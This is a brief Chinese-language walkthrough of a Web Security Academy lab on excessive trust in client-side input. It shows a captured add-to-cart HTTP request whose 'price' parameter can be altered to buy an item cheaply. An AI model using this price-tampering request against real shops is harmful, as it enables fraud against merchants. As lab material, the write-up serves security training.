好有意思的名字，对用户的过度信任，开始的时候一直抓包然后没找到price，谁知道是在将商品加入用户车的时候有一个price的泄露，一直以为是在购买的时候有一个price

将商品加入cart的数据包

```POST /cart HTTP/2
Host: 0a25002a03eeb5ea82724273007b008f.web-security-academy.net
Cookie: session=yxduTIAcJM9G8bF3GL0mxMNl6cEKp8jH
Content-Length: 49
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a25002a03eeb5ea82724273007b008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a25002a03eeb5ea82724273007b008f.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

productId=1&redir=PRODUCT&quantity=1&price=133700
```

将这里的price改一下即可